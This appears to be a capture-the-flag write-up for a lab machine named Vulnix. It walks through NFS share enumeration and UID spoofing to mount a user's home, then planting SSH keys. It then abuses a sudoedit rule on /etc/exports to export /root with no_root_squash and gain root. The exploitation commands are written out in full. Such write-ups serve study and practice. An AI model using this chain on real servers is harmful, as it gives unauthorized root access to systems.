I got ssh "user" credential and login to ssh but there is nothing I can with binary exploitation but I found another user "vulnix" and it's UID 2008 so I decided to enumerate another port.


---------------------------------------------------------------------------------------------------------------------------------------------------------------


I found port 2049/tcp nfs_acl

So, I research about that port number enumeration and found this article.

https://vk9-sec.com/2049-tcp-nfs-enumeration/

Step - 1

Enumeration
Showmount

1. To enumerate shares on the network you can use showmount command

showmount -e 10.0.2.10 

Step - 2

Mount the share

mkdir /tmp/nfs

Knowing the partition location (/home/vulnix) mount it to the new directory /tmp/nfs,

mount -t nfs 10.0.2.10:/home/vulnix /tmp/nfs -nolock

I use it's UID 2008 previously I found from "user" ssh.

useradd -u 2008 -m -d /home/vulnix vulnix

Then swith user to vulnix and access the folder.

su vulnix


---------------------------------------------------------------------------------------------------------------------------------------------------------------

After we mounted nfs /home/vulnix as /tmp/nfs, we can generate ssh key for vulnix.

1. ┌──(vulnix㉿kali)-[/tmp/nfs]
└─$ ssh-keygen -t ssh-rsa
Generating public/private ssh-rsa key pair.
Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): 
/home/vulnix/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/vulnix/.ssh/id_rsa
Your public key has been saved in /home/vulnix/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:jmrWo/MdhwoQYZoI6tRGhra07RW2ZGNFY1NTvdgavk4 vulnix@kali
The key's randomart image is:
+---[RSA 3072]----+
|. +o  o*.o...    |
|+B+. B. o .  .   |
|B.=o= +     o .  |
|oo.o o     o o   |
| .o .   S . o    |
|   o   o . o     |
|    ... + .E.    |
|    +ooo o..     |
|   oo+o.. ..     |
+----[SHA256]-----+


Copy public key into mounted location but need to create .ssh folder first.

2. ┌──(vulnix㉿kali)-[/tmp/nfs]
└─$ cp /home/vulnix/.ssh/id_rsa.pub .ssh/authorized_keys


Connect ssh with old public key accept type cause this machine is very old now.

3. ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa  vulnix@10.0.2.10


---------------------------------------------------------------------------------------------------------------------------------------------------------------

Priv Escalation

I run sudo -l as vulnix user and found:

vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports


(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports (We can edit /etc/exports as root)


So, I added /root directory into /etc/exports with no_root_squach End Of The Line.

***After Adding /root   *(rw,no_root_squash) Need to restart the machine to work***

Meaning, we can also mount root directory as /home/vulnix. 


showmount -e 10.0.2.10
Export list for 10.0.2.10:
/root        *
/home/vulnix *



mkdir /tmp/vulnix_root

mount -t nfs 10.0.2.10:/root /tmp/vulnix_root -nolock

generate ssh key as before

1. ssh-keygen -t ssh-rsa

2. cp /root/.ssh/id_rsa.pub ./authorized_keys

3. ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa  root@10.0.2.10
